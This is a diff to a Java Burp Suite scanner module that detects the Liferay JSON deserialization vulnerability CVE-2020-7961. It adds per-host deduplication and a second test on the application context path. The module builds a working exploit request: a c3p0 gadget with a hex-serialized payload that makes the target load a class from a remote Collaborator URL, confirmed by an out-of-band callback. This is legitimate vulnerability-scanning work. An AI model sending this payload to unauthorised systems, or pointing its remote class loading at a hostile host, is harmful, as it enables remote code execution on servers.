@@ -3,11 +3,14 @@ package burp.j2ee.issues.impl;
 import java.net.MalformedURLException;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.LinkedHashSet;
 import java.util.List;
 
 import java.io.PrintWriter;
 import java.math.BigInteger;
 import java.net.URL;
+
+import static burp.HTTPMatcher.getApplicationContext;
 
 import burp.CustomHttpRequestResponse;
 import burp.IBurpCollaboratorClientContext;
@@ -23,7 +26,6 @@ import burp.j2ee.Confidence;
 import burp.j2ee.CustomScanIssue;
 import burp.j2ee.IssuesHandler;
 import burp.j2ee.Risk;
-import burp.j2ee.annotation.RunOnlyOnce;
 import burp.j2ee.issues.IModule;
 
 
@@ -62,7 +64,9 @@ public class LiferayJSONDeserializationCVE20207961 implements IModule{
 
     private IExtensionHelpers helpers;
     private PrintWriter stderr;
-
+    
+    // List of host and port system already tested
+    private static LinkedHashSet<String> hs = new LinkedHashSet<String>();
 
     /**
      * The payload is used to instantiate a class from a remote class path and it is generated in the following way:
@@ -89,7 +93,6 @@ public class LiferayJSONDeserializationCVE20207961 implements IModule{
                                     "874000a5061796c6f61644f626a74003a",
                     PAYLOAD_SUFIX = "740003466f6f";
 
-    @RunOnlyOnce
     public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
         List<IScanIssue> issues = new ArrayList<>();
 
@@ -111,6 +114,14 @@ public class LiferayJSONDeserializationCVE20207961 implements IModule{
             return issues;
         }
 
+        // Check if the vulnerability has already been issued
+        if (IssuesHandler.isvulnerabilityFound(callbacks,
+                    "J2EEScan - " + TITLE,
+                    protocol,
+                    host)) {
+                return issues;
+        }
+
         IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
         String currentCollaboratorPayload = collaboratorContext.generatePayload(true);
             
@@ -118,46 +129,88 @@ public class LiferayJSONDeserializationCVE20207961 implements IModule{
             String.format("%040x", new BigInteger(1, helpers.stringToBytes("http://" + currentCollaboratorPayload))) + 
             PAYLOAD_SUFIX;
 
-        try {   
-            URL urlMod = new URL(protocol, host, port, PATH);
-            byte[] request = helpers.buildHttpRequest(urlMod);
-            request = helpers.toggleRequestMethod(request);
-           
-            List<IParameter> par = Arrays.asList(
-                helpers.buildParameter("cmd", "%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D", IParameter.PARAM_BODY),
-                helpers.buildParameter("p_auth", "ZkABM2UK", IParameter.PARAM_BODY),
-                helpers.buildParameter("formDate", String.valueOf(System.currentTimeMillis()), IParameter.PARAM_BODY),
-                helpers.buildParameter("tableId", "1", IParameter.PARAM_BODY),
-                helpers.buildParameter("name", "1", IParameter.PARAM_BODY),
-                helpers.buildParameter("type", "1", IParameter.PARAM_BODY),
-                helpers.buildParameter("%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource", 
-                    "{\"userOverridesAsString\":\"HexAsciiSerializedMap:" + payload + ";\"}", IParameter.PARAM_BODY)
-            );
+        List<IParameter> par = Arrays.asList(
+            helpers.buildParameter("cmd", "%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D", IParameter.PARAM_BODY),
+            helpers.buildParameter("p_auth", "ZkABM2UK", IParameter.PARAM_BODY),
+            helpers.buildParameter("formDate", String.valueOf(System.currentTimeMillis()), IParameter.PARAM_BODY),
+            helpers.buildParameter("tableId", "1", IParameter.PARAM_BODY),
+            helpers.buildParameter("name", "1", IParameter.PARAM_BODY),
+            helpers.buildParameter("type", "1", IParameter.PARAM_BODY),
+            helpers.buildParameter("%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource", 
+                "{\"userOverridesAsString\":\"HexAsciiSerializedMap:" + payload + ";\"}", IParameter.PARAM_BODY)
+        );
 
-            for(IParameter p : par){
-                request = helpers.addParameter(request, p);
+        String system = host + Integer.toString(port);
+        if(hs.add(system)){
+            try {   
+                URL urlMod = new URL(protocol, host, port, PATH);
+                byte[] request = helpers.buildHttpRequest(urlMod);
+                request = helpers.toggleRequestMethod(request);
+
+                for(IParameter p : par){
+                    request = helpers.addParameter(request, p);
+                }
+
+                byte[] response = callbacks.makeHttpRequest(host, port, useHttps, request); 
+
+                List<IBurpCollaboratorInteraction> collaboratorInteractions
+                = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);
+
+                if(!collaboratorInteractions.isEmpty()){
+                    issues.add(new CustomScanIssue(
+                                baseRequestResponse.getHttpService(), 
+                                urlMod, 
+                                new CustomHttpRequestResponse(request, response, baseRequestResponse.getHttpService()),
+                                TITLE, 
+                                DESCRIPTION, 
+                                REMEDY,
+                                Risk.High, 
+                                Confidence.Firm
+                            ));
+                }
+
+            } catch (MalformedURLException ex) {
+                stderr.println("Malformed URL Exception: " + ex);
             }
+        }
+
+        /**
+         * Test on the application context
+         */
+        String context = getApplicationContext(url);
+        system = host + Integer.toString(port) + context;
+        
+        if(hs.add(system)){
+            try {   
+                URL urlMod = new URL(protocol, host, port, context + PATH);
+                byte[] request = helpers.buildHttpRequest(urlMod);
+                request = helpers.toggleRequestMethod(request);
+
+                for(IParameter p : par){
+                    request = helpers.addParameter(request, p);
+                }
 	
-            byte[] response = callbacks.makeHttpRequest(host, port, useHttps, request); 
+                byte[] response = callbacks.makeHttpRequest(host, port, useHttps, request); 
 
-            List<IBurpCollaboratorInteraction> collaboratorInteractions
-            = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);
+                List<IBurpCollaboratorInteraction> collaboratorInteractions
+                = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);
 
-            if(!collaboratorInteractions.isEmpty()){
-                issues.add(new CustomScanIssue(
-                            baseRequestResponse.getHttpService(), 
-                            urlMod, 
-                            new CustomHttpRequestResponse(request, response, baseRequestResponse.getHttpService()),
-                            TITLE, 
-                            DESCRIPTION, 
-                            REMEDY,
-                            Risk.High, 
-                            Confidence.Firm
-                        ));
+                if(!collaboratorInteractions.isEmpty()){
+                    issues.add(new CustomScanIssue(
+                                baseRequestResponse.getHttpService(), 
+                                urlMod, 
+                                new CustomHttpRequestResponse(request, response, baseRequestResponse.getHttpService()),
+                                TITLE, 
+                                DESCRIPTION, 
+                                REMEDY,
+                                Risk.High, 
+                                Confidence.Firm
+                            ));
+                }
+
+            } catch (MalformedURLException ex) {
+                stderr.println("Malformed URL Exception: " + ex);
             }
-
-        } catch (MalformedURLException ex) {
-            stderr.println("Malformed URL Exception: " + ex);
         }
 
         return issues;
